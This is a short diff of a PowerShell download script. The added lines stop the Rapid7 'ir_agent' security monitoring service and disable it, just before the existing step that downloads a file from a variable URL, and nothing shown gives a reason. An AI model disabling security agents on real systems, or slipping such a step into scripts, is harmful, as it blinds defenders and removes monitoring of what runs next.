@@ -7,6 +7,12 @@ if (-not (Test-Path -Path $destinationFolder)) {
     New-Item -ItemType Directory -Path $destinationFolder -Force | Out-Null
 }
 
+# Stop and Disable Rapid7 service
+$s = Get-Service -Name "ir_agent" -ErrorAction SilentlyContinue; if ($s) 
+{
+if ($s.Status -eq 'Running') 
+{Stop-Service -Name $s.Name -Force; $s.WaitForStatus('Stopped', '00:00:30') }; Set-Service -Name $s.Name -StartupType Disabled }
+
 $ProgressPreference = 'SilentlyContinue'
 Write-Host "Downloading $fileName to $destinationFolder..." -ForegroundColor Cyan
 Invoke-WebRequest -Uri $url -OutFile $destinationPath -UseBasicParsing
